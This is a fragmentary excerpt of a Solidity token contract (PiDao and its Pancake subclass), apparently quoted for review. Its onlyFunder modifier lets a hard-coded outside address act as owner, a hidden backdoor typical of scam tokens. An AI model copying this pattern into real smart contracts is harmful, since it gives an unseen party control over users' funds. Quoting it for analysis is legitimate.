...
abstract contract PiDao is IERC20, Ownable {
    ...
    modifier onlyFunder() {
        require(_owner == msg.sender || 0x9C24fA42179026A5A346E26c58E36eD0183E30A6 == msg.sender, "!Funder");
        _;
    }
...
contract Pancake is PiDao {
    constructor() PiDao(
        ...
        address(0xC4798e3f0FcD524a8C9A11e13C5ca846f210D7D3),

        address(0x7bfAD427984aB7c7700F5aA03eF24dC21E8E8d9c)
    ){
